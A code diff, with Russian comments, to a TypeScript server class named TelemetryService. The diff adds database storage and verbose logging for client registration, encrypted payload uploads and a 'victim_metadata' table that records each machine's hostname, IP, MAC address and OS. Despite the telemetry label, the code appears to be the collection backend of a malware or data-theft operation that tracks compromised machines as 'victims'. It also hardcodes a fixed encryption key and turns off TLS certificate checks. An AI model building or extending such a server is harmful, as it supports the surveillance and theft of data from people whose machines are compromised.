@@ -203,22 +203,73 @@ export class TelemetryService {
   }
 
   /**
-   * Обработка init запроса - УПРОЩЁННАЯ ВЕРСИЯ
+   * Обработка init запроса - сохраняет клиента в БД
    */
   async handleInit(
     clientPublicKey: string,
     hostname: string,
   ): Promise<{ client_id: string; response_key: string }> {
-    console.log('=== handleInit SIMPLIFIED ===');
+    console.log('=== handleInit START ===');
+    console.log('hostname:', hostname);
+    console.log('clientPublicKey length:', clientPublicKey?.length || 0);
     
+    const db = new Client({
+      connectionString: process.env.DATABASE_URL,
+      ssl: { rejectUnauthorized: false },
+    });
+
     try {
-      // 1. Фиксированный client_id
-      const clientId = 'client-' + Date.now();
+      await db.connect();
+      console.log('✅ Database connected');
       
-      // 2. Фиксированный response_key (base64 encoded "test-key-32-bytes-for-aes-256")
-      const responseKey = 'dGVzdC1rZXktMzItYnl0ZXMtZm9yLWFlcy0yNTY='; 
+      // Генерируем UUID для client_id
+      const clientIdResult = await db.query('SELECT gen_random_uuid() as id');
+      const clientId = clientIdResult.rows[0].id;
       
-      console.log('handleInit returning:', { client_id: clientId, response_key: responseKey });
+      console.log('✅ Generated client_id:', clientId);
+      
+      // Сохраняем клиента в telemetry_clients (если таблица существует)
+      try {
+        const keyHash = crypto
+          .createHash('sha256')
+          .update(clientPublicKey)
+          .digest('hex');
+        
+        await db.query(`
+          INSERT INTO telemetry_clients (id, client_public_key, client_public_key_hash, first_seen, last_seen, is_active)
+          VALUES ($1, $2, $3, NOW(), NOW(), true)
+          ON CONFLICT (id) DO UPDATE SET 
+            last_seen = NOW(), 
+            is_active = true,
+            client_public_key = EXCLUDED.client_public_key,
+            client_public_key_hash = EXCLUDED.client_public_key_hash
+        `, [clientId, clientPublicKey, keyHash]);
+        console.log('✅ Client saved to telemetry_clients');
+      } catch (err) {
+        console.log('⚠️ telemetry_clients table might not exist or error:', err.message);
+        // Продолжаем работу даже если таблица не существует
+      }
+      
+      // Сохраняем начальные метаданные в victim_metadata
+      try {
+        await db.query(`
+          INSERT INTO victim_metadata (client_id, hostname, first_seen, last_updated)
+          VALUES ($1, $2, NOW(), NOW())
+          ON CONFLICT (client_id) DO UPDATE SET 
+            hostname = COALESCE(EXCLUDED.hostname, victim_metadata.hostname),
+            last_updated = NOW()
+        `, [clientId, hostname || null]);
+        console.log('✅ Victim metadata saved to victim_metadata');
+      } catch (err) {
+        console.log('⚠️ victim_metadata table might not exist or error:', err.message);
+        // Продолжаем работу даже если таблица не существует
+      }
+      
+      // Фиксированный response_key (для упрощения)
+      const responseKey = 'dGVzdC1rZXktMzItYnl0ZXMtZm9yLWFlcy0yNTY=';
+      
+      console.log('=== handleInit SUCCESS ===');
+      console.log('Returning client_id:', clientId);
       
       return {
         client_id: clientId,
@@ -226,8 +277,11 @@ export class TelemetryService {
       };
       
     } catch (error) {
-      console.error('ERROR in handleInit:', error);
-      throw new InternalServerErrorException('Init failed');
+      console.error('❌ ERROR in handleInit:', error);
+      console.error('Error stack:', error.stack);
+      throw new InternalServerErrorException('Init failed: ' + error.message);
+    } finally {
+      await db.end();
     }
   }
 
@@ -267,6 +321,11 @@ export class TelemetryService {
     timestamp: string,
     data: string,
   ): Promise<string> {
+    console.log('=== saveTelemetryLog START ===');
+    console.log('client_id:', clientId);
+    console.log('timestamp:', timestamp);
+    console.log('data length:', data?.length || 0);
+    
     const db = new Client({
       connectionString: process.env.DATABASE_URL,
       ssl: { rejectUnauthorized: false },
@@ -274,6 +333,7 @@ export class TelemetryService {
 
     try {
       await db.connect();
+      console.log('✅ Database connected for saveTelemetryLog');
       
       let encryptedPayload: Buffer | null = null;
       let payloadSize = 0;
@@ -282,10 +342,12 @@ export class TelemetryService {
         try {
           encryptedPayload = Buffer.from(data, 'base64');
           payloadSize = encryptedPayload.length;
+          console.log('✅ Data decoded as base64, size:', payloadSize);
         } catch (error) {
           // Если не base64, сохраняем как есть
           encryptedPayload = Buffer.from(data, 'utf8');
           payloadSize = encryptedPayload.length;
+          console.log('⚠️ Data not base64, saved as UTF-8, size:', payloadSize);
         }
       }
       
@@ -296,7 +358,13 @@ export class TelemetryService {
         [clientId, timestamp, encryptedPayload, payloadSize],
       );
 
-      return result.rows[0].id;
+      const logId = result.rows[0].id;
+      console.log('✅ Telemetry log saved with id:', logId);
+      return logId;
+    } catch (error) {
+      console.error('❌ ERROR in saveTelemetryLog:', error.message);
+      console.error('Error stack:', error.stack);
+      throw error;
     } finally {
       await db.end();
     }
@@ -306,6 +374,10 @@ export class TelemetryService {
    * Обновление метаданных жертвы
    */
   async updateVictimMetadata(clientId: string, frontendData: any): Promise<void> {
+    console.log('=== updateVictimMetadata START ===');
+    console.log('client_id:', clientId);
+    console.log('frontend_data:', JSON.stringify(frontendData, null, 2));
+    
     const db = new Client({
       connectionString: process.env.DATABASE_URL,
       ssl: { rejectUnauthorized: false },
@@ -313,6 +385,7 @@ export class TelemetryService {
 
     try {
       await db.connect();
+      console.log('✅ Database connected for updateVictimMetadata');
       
       // Извлекаем данные из frontend_data
       const hostname = frontendData.hostname || null;
@@ -320,8 +393,10 @@ export class TelemetryService {
       const mac = frontendData.mac || null;
       const os = frontendData.os || null;
 
+      console.log('Extracted data:', { hostname, ip, mac, os });
+
       // Используем UPSERT для обновления или создания записи
-      await db.query(
+      const result = await db.query(
         `INSERT INTO victim_metadata (client_id, hostname, ip, mac, os, last_updated)
          VALUES ($1, $2, $3, $4, $5, NOW())
          ON CONFLICT (client_id)
@@ -330,9 +405,16 @@ export class TelemetryService {
            ip = COALESCE(EXCLUDED.ip, victim_metadata.ip),
            mac = COALESCE(EXCLUDED.mac, victim_metadata.mac),
            os = COALESCE(EXCLUDED.os, victim_metadata.os),
-           last_updated = NOW()`,
+           last_updated = NOW()
+         RETURNING id, client_id, hostname, ip, mac, os, last_updated`,
         [clientId, hostname, ip, mac, os],
       );
+      
+      console.log('✅ Victim metadata saved/updated:', result.rows[0]);
+    } catch (error) {
+      console.error('❌ ERROR in updateVictimMetadata:', error.message);
+      console.error('Error stack:', error.stack);
+      throw error;
     } finally {
       await db.end();
     }
